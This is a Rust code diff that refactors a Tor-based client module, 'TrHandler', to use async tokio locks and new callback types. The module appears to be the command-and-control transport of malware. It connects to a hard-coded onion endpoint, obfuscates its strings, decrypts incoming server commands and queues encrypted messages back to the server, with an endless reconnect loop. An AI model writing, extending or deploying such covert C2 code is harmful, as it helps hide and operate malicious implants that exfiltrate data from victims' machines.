@@ -1,4 +1,4 @@
-use std::{ collections::VecDeque, path::PathBuf, sync::{ Arc, Mutex, RwLock }, time::Duration };
+use std::{ collections::VecDeque, future::Future, path::PathBuf, sync::Arc, time::Duration };
 use anyhow::{ Context, Result };
 use arti_client::{ DataStream, StreamPrefs, TorClient, TorClientConfig };
 use obfstr::obfstr as s;
@@ -13,7 +13,7 @@ use crate::{
     logs::logger::Logger,
     utils::encryption::{ convert_key_to_bytes, sauron_decrypt },
 };
-use tokio::{ io::{ AsyncReadExt, AsyncWriteExt }, time::interval };
+use tokio::{ io::{ AsyncReadExt, AsyncWriteExt }, sync::{ Mutex, RwLock }, time::interval };
 use serde::{ Deserialize, Serialize };
 use crate::ref_log_internal;
 
@@ -86,14 +86,8 @@ impl TrHandler {
         Ok(tor_handler)
     }
     pub async fn connect_to_endpoint(&mut self) -> Result<()> {
-        let tor_client = self.tr_clnt.lock().map_err(|_| {
-            ref_err!(self.logger.lock().unwrap().as_ref().expect("no logger"), "Lock poisoned");
-            anyhow::anyhow!(s!("Lock poisoned").to_string())
-        })?;
-        let stream_prefs = self.stream_prefs.read().map_err(|_| {
-            ref_err!(self.logger.lock().unwrap().as_ref().expect("no logger"), "Lock poisoned");
-            anyhow::anyhow!(s!("Lock poisoned").to_string())
-        })?;
+        let tor_client = self.tr_clnt.lock().await;
+        let stream_prefs = self.stream_prefs.read().await;
         let stream = tor_client
             .connect_with_prefs((onion_endpoint(), 80), &stream_prefs).await
             .context(s!("Failed to connect to onion endpoint").to_string())?;
@@ -102,41 +96,56 @@ impl TrHandler {
 
         Ok(())
     }
-    pub async fn run<CC, RC>(&mut self, connect_callback: CC, receive_callback: RC)
+    pub async fn run<ReceiveCallbackFunc, ConnectCallbackFunc, ParentType>(
+        &mut self,
+        parent_self_ref: Arc<RwLock<ParentType>>,
+        receive_callback: ReceiveCallbackFunc,
+        connect_callback: ConnectCallbackFunc
+    )
         where
-            CC: FnMut() + Send + Sync + Clone + 'static,
-            RC: FnMut(&Self, Vec<u8>) -> Result<()> + Send + Sync + Clone + 'static
+            ReceiveCallbackFunc: Fn(Arc<RwLock<ParentType>>, Vec<u8>) +
+                Send +
+                Sync +
+                Clone +
+                'static,
+            ConnectCallbackFunc: Fn(Arc<RwLock<ParentType>>) + Send + Sync + Clone + 'static
     {
+        // CC: FnMut() + Send + Sync + Clone + 'static,
         let self_clone = self.clone();
         ref_info!(
-            self.logger.lock().unwrap().as_ref().expect("no logger"),
+            self.logger.lock().await.as_ref().expect("no logger"),
             "SPAWNING SEND QUEUE TASK"
         );
-        tokio::task::spawn_local(async move { self_clone.send_queue_task().await });
-        ref_info!(self.logger.lock().unwrap().as_ref().expect("no logger"), "SPAWNED");
+        tokio::task::spawn(async move { self_clone.send_queue_task().await });
+        ref_info!(self.logger.lock().await.as_ref().expect("no logger"), "SPAWNED");
         loop {
             ref_info!(
-                self.logger.lock().unwrap().as_ref().expect("no logger"),
+                self.logger.lock().await.as_ref().expect("no logger"),
                 "RUNNING self.connect_to_endpoint()"
             );
             match self.connect_to_endpoint().await {
                 Ok(()) => {
                     // should send connect callback
-                    connect_callback.clone()();
+                    connect_callback(parent_self_ref.clone());
                     ref_info!(
-                        self.logger.lock().unwrap().as_ref().expect("no logger"),
+                        self.logger.lock().await.as_ref().expect("no logger"),
                         " connect_callback.clone()(); DONE"
                     );
 
                     loop {
-                        if let Err(_error) = self.handle_receive(receive_callback.clone()).await {
+                        if
+                            let Err(_error) = self.handle_receive(
+                                parent_self_ref.clone(),
+                                receive_callback.clone()
+                            ).await
+                        {
                             // ref_err!(
                             //     self.logger.lock().unwrap(),
                             //     "Failed to handle_receive: ",
                             //     error
                             // );
                             ref_info!(
-                                self.logger.lock().unwrap().as_ref().expect("no logger"),
+                                self.logger.lock().await.as_ref().expect("no logger"),
                                 "if let Err(_error) = self.handle_receive(receive_callback.clone()).await {"
                             );
                             // so we will try reconnect to endpoint again after interval
@@ -144,7 +153,7 @@ impl TrHandler {
                         }
                         tokio::time::sleep(
                             Duration::from_millis(
-                                self.retry_read_stream_interval_ms.read().unwrap().to_owned()
+                                self.retry_read_stream_interval_ms.read().await.to_owned()
                             )
                         ).await;
                     }
@@ -152,50 +161,38 @@ impl TrHandler {
                 Err(_error) => {
                     // ref_err!(self.logger.lock().unwrap(), "Failed to connect_to_endpoint");
                     ref_err!(
-                        self.logger.lock().unwrap().as_ref().expect("no logger"),
+                        self.logger.lock().await.as_ref().expect("no logger"),
                         "Failed to connect_to_endpoint, timeouting retry"
                     );
                 }
             }
             ref_info!(
-                self.logger.lock().unwrap().as_ref().expect("no logger"),
+                self.logger.lock().await.as_ref().expect("no logger"),
                 "STARTING RETRY CONNECT SLEEP"
             );
             tokio::time::sleep(
-                Duration::from_millis(self.retry_connect_interval_ms.read().unwrap().to_owned())
+                Duration::from_millis(self.retry_connect_interval_ms.read().await.to_owned())
             ).await;
         }
     }
-    async fn handle_receive<F>(&self, callback: F) -> Result<()>
-        where F: FnMut(&Self, Vec<u8>) -> Result<()> + Send + Sync + Clone + 'static
+    async fn handle_receive<RC, CT>(
+        &self,
+        parent_self_ref: Arc<RwLock<CT>>,
+        callback: RC
+    ) -> Result<()>
+        where RC: Fn(Arc<RwLock<CT>>, Vec<u8>) + Send + Sync + Clone + 'static
     {
         loop {
             let data = self
                 .read_data().await
                 .context(s!("Failed to read_data from stream").to_string())?;
 
-            let mut self_clone = self.clone();
-            let mut callback_clone = callback.clone(); // Clone the callback here
-            tokio::task::spawn(async move {
-                if
-                    let Ok(decrypted_data) = sauron_decrypt(
-                        convert_key_to_bytes(&communication_encryption_key()),
-                        &data
-                    )
-                {
-                    if let Err(_error) = callback_clone(&mut self_clone, decrypted_data) {
-                        //? HONESTLY THIS ERROR VERY IMPORTANT WE SHOULD REPORT IT TO SERVER VIA DEFAULT ERROR type
-                        // ref_err!(
-                        //     self_clone.logger.lock().unwrap(),
-                        //     "Failed to process data via callback: ",
-                        //     error
-                        // );
-                    };
-                }
-            });
+            let parent_clone = parent_self_ref.clone();
+
+            callback(parent_clone.clone(), data);
 
             tokio::time::sleep(
-                Duration::from_millis(self.tcp_receive_poll_delay_ms.read().unwrap().to_owned())
+                Duration::from_millis(self.tcp_receive_poll_delay_ms.read().await.to_owned())
             ).await;
         }
     }
@@ -203,10 +200,7 @@ impl TrHandler {
     async fn read_data(&self) -> Result<Vec<u8>> {
         let read_stream_ref = self.get_stream()?;
 
-        let mut stream = read_stream_ref.lock().map_err(|_| {
-            ref_err!(self.logger.lock().unwrap().as_ref().expect("no logger"), "Lock poisoned");
-            anyhow::anyhow!(s!("Lock poisoned").to_string())
-        })?;
+        let mut stream = read_stream_ref.lock().await;
         stream.wait_for_connection().await?;
 
         let data_length = match stream.read_u32_le().await {
@@ -227,43 +221,32 @@ impl TrHandler {
 
     async fn send_queue_task(&self) -> ! {
         let mut interval = interval(
-            Duration::from_millis(self.queue_tick_interval_ms.read().unwrap().to_owned())
+            Duration::from_millis(self.queue_tick_interval_ms.read().await.to_owned())
         );
         loop {
             interval.tick().await;
-            let mut queue = self.send_queue
-                .lock()
-                .map_err(|_| {
-                    ref_err!(
-                        self.logger.lock().unwrap().as_ref().expect("no logger"),
-                        "Lock poisoned"
-                    );
-                    anyhow::anyhow!(s!("Lock poisoned").to_string())
-                })
-                .unwrap();
+            let mut queue = self.send_queue.lock().await;
             while let Some(data) = queue.pop_front() {
                 if let Err(_error) = self.encrypt_and_send(&data).await {
                     // ref_err!(self.logger.lock().unwrap(), "Failed to encrypt_and_send");
                     ref_err!(
-                        self.logger.lock().unwrap().as_ref().expect("no logger"),
+                        self.logger.lock().await.as_ref().expect("no logger"),
                         "Failed to encrypt_and_send"
                     );
                 }
             }
         }
     }
-    pub fn add_to_send_queue(&self, server_receive_type: SrvRcvTp, data: Vec<u8>) -> Result<()> {
+    pub async fn add_to_send_queue(
+        &self,
+        server_receive_type: SrvRcvTp,
+        data: Vec<u8>
+    ) -> Result<()> {
         let send = ServerReceive { server_receive_type, data };
         let binary_data = serde_json
             ::to_vec(&send)
             .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;
-        self.send_queue
-            .lock()
-            .map_err(|_| {
-                ref_err!(self.logger.lock().unwrap().as_ref().expect("no logger"), "Lock poisoned");
-                anyhow::anyhow!(s!("Lock poisoned").to_string())
-            })?
-            .push_back(binary_data);
+        self.send_queue.lock().await.push_back(binary_data);
         Ok(())
     }
     async fn encrypt_and_send(&self, data: &[u8]) -> Result<()> {
@@ -275,7 +258,7 @@ impl TrHandler {
     }
     async fn send_data(&self, data: &[u8]) -> Result<()> {
         let read_stream_ref = self.get_stream()?;
-        let mut stream = read_stream_ref.lock().unwrap();
+        let mut stream = read_stream_ref.lock().await;
         stream.write_all(data).await.context(s!("Failed to write to stream").to_string())?;
         stream.flush().await.context(s!("Failed to flush stream").to_string())?;
         Ok(())
